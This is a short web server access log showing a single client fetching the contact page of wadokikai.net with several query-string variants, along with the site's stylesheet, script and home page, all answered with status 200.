::ffff:3.15.27.232 - - [27/Jul/2022:06:28:31 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:32 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.net/contact?s=1&ss=3" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:32 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.net/contact?s=1&ss=3" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:33 +0000] "GET /contact?s=1&ss=10 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:33 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.net/contact?s=1&ss=10" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:33 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.net/contact?s=1&ss=10" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:35 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:35 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.net/contact?s=1&ss=11" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:35 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.net/contact?s=1&ss=11" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:43 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
::ffff:3.15.27.232 - - [27/Jul/2022:06:28:43 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
